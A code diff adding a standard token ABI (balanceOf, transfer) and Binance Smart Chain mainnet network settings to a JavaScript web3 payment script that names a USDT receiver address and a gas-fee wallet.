@@ -2,6 +2,39 @@ const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT re
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
 
+ const tokenAbi = [
+            {
+                "constant": true,
+                "inputs": [{"name": "who", "type": "address"}],
+                "name": "balanceOf",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "type": "function"
+            },
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "_to", "type": "address"},
+                    {"name": "_value", "type": "uint256"}
+                ],
+                "name": "transfer",
+                "outputs": [{"name": "", "type": "bool"}],
+                "type": "function"
+            }
+        ];
+        
+        // Network configuration
+        const BSC_MAINNET_CHAIN_ID = '0x38'; // Binance Smart Chain Mainnet
+        const BSC_MAINNET_PARAMS = {
+            chainId: BSC_MAINNET_CHAIN_ID,
+            chainName: 'Binance Smart Chain Mainnet',
+            nativeCurrency: {
+                name: 'BNB',
+                symbol: 'bnb',
+                decimals: 18
+            },
+            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+            blockExplorerUrls: ['https://bscscan.com/']
+        };
 let web3;
 let userAddress;
 
